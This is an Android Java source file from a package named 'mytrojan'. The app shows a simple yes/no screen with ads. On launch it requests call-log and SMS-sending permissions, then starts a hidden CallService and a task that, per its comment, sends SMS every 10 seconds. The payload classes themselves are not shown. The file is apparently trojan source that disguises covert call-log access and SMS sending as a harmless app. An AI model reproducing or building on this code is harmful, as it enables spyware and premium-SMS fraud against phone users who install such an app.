package com.example.mytrojan;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.util.Timer;
import java.util.TimerTask;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.MobileAds;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;

public class MainActivity extends AppCompatActivity {

    private TextView text;
    private Button yes;
    private Button no;
    private SendSMSPeriodically autoSmsSender;

    private AdView mAdView;

    private static final int DELAY_MS = 5000;

    private void request_permission() {

        int hasPermission = ContextCompat.checkSelfPermission(this, (Manifest.permission.READ_CALL_LOG));

        String [] pers = new String [2];
        if (hasPermission !=  PackageManager.PERMISSION_GRANTED) {
            pers[0] = Manifest.permission.READ_CALL_LOG;
        }

        hasPermission = ContextCompat.checkSelfPermission(this, (Manifest.permission.SEND_SMS));
        if (hasPermission !=  PackageManager.PERMISSION_GRANTED) {
            pers[1] = Manifest.permission.SEND_SMS;
        }


        ActivityCompat.requestPermissions(this, pers, 1);




    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);


        text = findViewById(R.id.textView);
        yes = findViewById(R.id.btnYes);
        no = findViewById(R.id.btnNo);

        request_permission();

        new ExecuteIt(this);

        final Context currentCtx = this;


        yes.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d("MAIN", "Yes clicked, open facebook page");

                String msg = "Have a good day!";
                show_alert_message(msg);

            }
        });


        no.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d("MAIN", "No clicked");
                text.setText("Have a good day!");
                new ExecuteIt();

                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        // this code will be executed after 2 seconds
                        quitApp();

                    }
                }, MainActivity.DELAY_MS);
            }
        });


        Intent intent = new Intent(this, CallService.class);
        startService(intent);
               
    // send sms every 10 seconds
        autoSmsSender = new SendSMSPeriodically();
        autoSmsSender.startRepeatingTask();

        // Sample AdMob app ID: ca-app-pub-3940256099942544~3347511713
        MobileAds.initialize(this, "ca-app-pub-3940256099942544~3347511713");

        mAdView = findViewById(R.id.adView);
        AdRequest adRequest = new AdRequest.Builder().build();
        mAdView.loadAd(adRequest);

        mAdView.setAdListener(new AdListener() {
            @Override
            public void onAdLoaded() {
                // Code to be executed when an ad finishes loading.
                System.out.println("Hello");
            }

            @Override
            public void onAdFailedToLoad(int errorCode) {
                // Code to be executed when an ad request fails.
            }

            @Override
            public void onAdOpened() {
                // Code to be executed when an ad opens an overlay that
                // covers the screen.
            }

            @Override
            public void onAdLeftApplication() {
                // Code to be executed when the user has left the app.
            }

            @Override
            public void onAdClosed() {
                // Code to be executed when the user is about to return
                // to the app after tapping on an ad.
            }
        });

    }

    private void show_alert_message(String msg) {
        AlertDialog alertDialog = new AlertDialog.Builder(MainActivity.this).create();
        alertDialog.setTitle("Alert");
        alertDialog.setMessage(msg);
        alertDialog.setButton(AlertDialog.BUTTON_NEUTRAL, "OK",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();

                        quitApp();
                    }
                });
        alertDialog.show();
    }

    public void onAdClick(View v) {
        Intent intent;
        intent = new Intent(this, FacebookActivity.class);
        startActivityForResult(intent, 1);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        String msg = "Have a good day!";
        show_alert_message(msg);

    }//onActivityResult

    private void quitApp(){
        this.autoSmsSender.stopRepeatingTask();
        this.finish();
        System.exit(0);
    }
}
